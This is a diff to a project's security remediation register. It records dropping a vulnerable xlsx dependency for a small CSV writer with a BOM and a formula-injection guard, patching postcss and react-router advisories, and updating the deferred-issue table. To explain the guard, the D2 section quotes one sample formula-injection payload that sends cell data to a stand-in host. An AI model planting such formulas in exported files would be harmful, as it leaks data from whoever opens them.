@@ -8,7 +8,7 @@ Severity: **Blocker** — the documented setup or a headline feature does not wo
 **Security** · **High** — wrong behaviour users will hit · **Medium** — wrong behaviour
 under load or at an edge · **Low** — hygiene.
 
-Summary: **53 items — 42 fixed, 11 deferred.** D12 (frontend structural debt) was
+Summary: **53 items — 43 fixed, 10 deferred.** D12 (frontend structural debt) was
 cleared in a follow-up pass, along with D13 and D14, which that pass had carved
 out of it; see below.
 
@@ -108,7 +108,7 @@ where each part landed:
 | Three hand-rolled share modals | One `ShareModal`; the five inline `window.location.origin` URLs are in `lib/links.ts`. |
 | `generateId` copy-pasted three times | `lib/id.ts`, wrapping `crypto.randomUUID()`. |
 | Blocking `confirm()`/`alert()` | `ConfirmDialog` and the Toast store. None left. |
-| 1.65 MB unsplit JS bundle | Entry chunk 409 kB (gzip 126). `xlsx` (425 kB) and `html2pdf` (936 kB) are dynamic imports fetched on first export click. **This does not resolve D2** — the vulnerable code still loads, just later. |
+| 1.65 MB unsplit JS bundle | Entry chunk 408 kB (gzip 125). `html2pdf` (936 kB) is a dynamic import fetched on first export click; `xlsx` (425 kB) was deleted outright — see D2. |
 | Dead `src/App.css`, `src/assets/`, `index.html` titled "frontend", stock Vite `frontend/README.md` | Deleted, retitled, rewritten. |
 | 12 oxlint warnings | 0 across 51 files. |
 | ~50 `any` types | 22, nearly all on axios error objects and the untyped html2pdf worker. |
@@ -147,6 +147,43 @@ answers and played games with them. An id that is unknown, or belongs to a
 different parent, is treated as an insert rather than trusted into an UPDATE of
 another row. The per-item routes remain for scripted use.
 
+### D2 — vulnerable spreadsheet dependency
+
+`xlsx@0.18.5` carried CVE-2023-30533 (prototype pollution) and a ReDoS advisory,
+with **no fixed version published to npm** — upstream ships the fix only from
+the SheetJS CDN. `npm audit` reported it as unfixable for as long as the
+dependency existed.
+
+It was a 425 kB spreadsheet engine used for exactly one thing: writing a single
+flat sheet of strings. It is gone, replaced by `lib/csv.ts` — about 40 lines,
+no dependency. CSV opens in Excel on double-click, and the PDF export already
+covers the formatted-report case.
+
+Two things the CSV writer does that the xlsx path did not:
+
+- **A UTF-8 BOM.** Without it Excel decodes the file as the system ANSI
+  codepage and every Arabic answer arrives as mojibake.
+- **A formula-injection guard.** A cell beginning `=`, `+`, `-`, `@`, tab or CR
+  is executed as a formula by Excel, LibreOffice and Google Sheets. These
+  values are typed by strangers into a *public* form and opened by an admin, so
+  a submitted answer of `=HYPERLINK("https://evil.test?"&A1,"Click")` ran on
+  open. The old export had the same hole and nothing had flagged it.
+
+Two further advisories surfaced during this work that were not in the register:
+
+- **postcss** path traversal (GHSA-r28c-9q8g-f849) — patched by a version bump.
+- **react-router** RSC-mode CSRF bypass (GHSA-qwww-vcr4-c8h2), affecting
+  7.12.0–8.2.0. The app was on 7.18.1. The vulnerable path is not reachable
+  here — it needs `RouterProvider` with a server-action pipeline, and this app
+  uses only `BrowserRouter`, `Routes`, `Route`, `Navigate`, `Outlet` and the
+  navigation hooks — but no patched 7.x exists. `react-router-dom` was
+  discontinued at 7.18.2, so the fix meant migrating imports to `react-router`
+  and taking 8.3.0. Covered by a new router smoke test (`src/App.test.tsx`),
+  which asserts the public homepage, the login page, and that an anonymous
+  visitor to an admin route is redirected.
+
+`npm audit` now reports **0 vulnerabilities**.
+
 ### D14 — no frontend tests
 
 Also carved out of D12, and the reason the refactor came first: the logic worth
@@ -179,7 +216,6 @@ Real defects, deliberately out of scope for the remediation pass. Roughly in pri
 | ID | Severity | Where | Issue | Why deferred |
 |---|---|---|---|---|
 | D1 | Security | `AuthStore.ts`, `client.ts` | The JWT lives in `localStorage`, readable by any XSS on the origin. An httpOnly, SameSite cookie plus a refresh-token flow is the correct design. | Needs a refresh-token endpoint, CSRF protection, and a coordinated frontend change. Meaningful only after D2. |
-| D2 | Security | `package.json` | `xlsx@0.18.5` carries CVE-2023-30533 (prototype pollution) and a ReDoS advisory. No fixed version exists on npm — the fix ships only from the SheetJS CDN. It is statically imported by `ResponsesTable.tsx`, so it loads on every page. | Requires either a vendored CDN build or migrating to another spreadsheet library. |
 | D3 | High | `response_handler.go` | `Submit` always passes `nil` for vectors, so `response_answer_vector_repository.go` (152 lines), the `response_answer_vectors` table, its HNSW index and the model-name enum are **entirely unreachable**. The embedding dimension is also `vector(1536)` (an OpenAI size) while the project uses Gemini, whose models are 768/3072. | Semantic search is an unbuilt feature, not a regression. Needs a product decision before the dimension is fixed. |
 | D4 | High | `form_usecase.go` | `Publish` and `Close` have no routes. The only way to publish a form is the untyped `status` field on `PUT /forms/:id`, which bypasses the state-machine rules those methods enforce. | Small, but it changes the public API surface. |
 | D5 | Medium | `quiz_handler.go` | `Position int` is tagged `binding:"required"`, and Go's validator treats `0` as absent — so **position 0 is rejected** and positions must start at 1 by accident. `UpdateQuestion`/`DeleteQuestion` read `:qid` but ignore `:id`, so no check that the question belongs to that quiz. | Ownership check needs a repository method that does not exist yet. |
